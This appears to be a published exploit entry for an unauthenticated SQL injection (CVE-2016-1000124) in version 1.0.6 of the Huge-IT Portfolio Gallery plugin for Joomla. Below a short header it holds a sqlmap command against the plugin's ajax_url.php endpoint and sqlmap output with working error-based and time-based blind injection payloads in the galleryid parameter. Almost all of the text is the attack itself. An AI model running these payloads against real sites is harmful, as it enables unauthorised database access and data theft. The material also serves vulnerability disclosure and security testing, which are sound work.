@@ -1,0 +1,34 @@
+# Exploit Title Unauthenticated SQL Injection in Huge-IT Portfolio Gallery Plugin v1.0.6
+# Date: 2016-09-16
+# Exploit Author: Larry W. Cashdollar, @_larry0
+# Vendor Homepage: http://huge-it.com/joomla-portfolio-gallery/
+# Software Link: 
+# Version: 1.0.6
+# Tested on: Linux
+# CVE : CVE-2016-1000124
+# Advisory: http://www.vapidlabs.com/advisory.php?v=170
+# Exploit:
+	• $ sqlmap -u 'http://example.com/components/com_portfoliogallery/ajax_url.php' --data="page=1&galleryid=*&post=huge_it_portfolio_gallery_ajax&perpage=20&linkbutton=2" 
+	•  
+	•  
+	• (custom) POST parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	• sqlmap identified the following injection point(s) with a total of 2870 HTTP(s) requests:
+	• ---
+	• Parameter: #1* ((custom) POST)
+	•     Type: error-based
+	•     Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
+	•     Payload: page=1&galleryid=-2264 OR 1 GROUP BY CONCAT(0x71716a7a71,(SELECT (CASE WHEN (3883=3883) THEN 1 ELSE 0 END)),0x7178627071,FLOOR(RAND(0)*2)) HAVING MIN(0)#&post=huge_it_portfolio_gallery_ajax&perpage=20&linkbutton=2
+	•  
+	•     Type: AND/OR time-based blind
+	•     Title: MySQL >= 5.0.12 time-based blind - Parameter replace
+	•     Payload: page=1&galleryid=(CASE WHEN (9445=9445) THEN SLEEP(5) ELSE 9445 END)&post=huge_it_portfolio_gallery_ajax&perpage=20&linkbutton=2
+	• ---
+	• [13:30:39] [INFO] the back-end DBMS is MySQL
+	• web server operating system: Linux Debian 8.0 (jessie)
+	• web application technology: Apache 2.4.10
+	• back-end DBMS: MySQL >= 5.0.12
+	• [13:30:39] [WARNING] HTTP error codes detected during run:
+	• 500 (Internal Server Error) - 2715 times
+	• [13:30:39] [INFO] fetched data logged to text files under '/home/larry/.sqlmap/output/192.168.0.4'
+	•  
+	• [*] shutting down at 13:30:39
